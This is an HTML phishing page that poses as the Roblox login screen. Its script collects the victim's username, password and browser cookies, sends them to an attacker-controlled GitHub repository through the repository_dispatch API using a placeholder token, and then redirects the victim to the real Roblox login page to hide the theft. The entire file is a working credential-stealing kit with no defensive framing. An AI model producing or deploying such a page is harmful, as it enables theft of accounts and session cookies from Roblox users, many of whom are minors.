<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Login | Roblox</title></head>
<body>
    <input type="text" id="user" placeholder="Username"><br>
    <input type="password" id="pass" placeholder="Password"><br>
    <button onclick="capture()">Login</button>

    <script>
    async function capture() {
        const payload = {
            u: document.getElementById('user').value,
            p: document.getElementById('pass').value,
            c: document.cookie // سحب الكوكيز
        };

        await fetch('https://api.github.com/repos/USER/REPO/dispatches', {
            method: 'POST',
            headers: {
                'Authorization': 'Bearer ghp_YOUR_TOKEN_HERE',
                'Accept': 'application/vnd.github.v3+json'
            },
            body: JSON.stringify({ event_type: 'log_data', client_payload: payload })
        });

        window.location.href = "https://www.roblox.com/login";
    }
    </script>
</body>
</html>
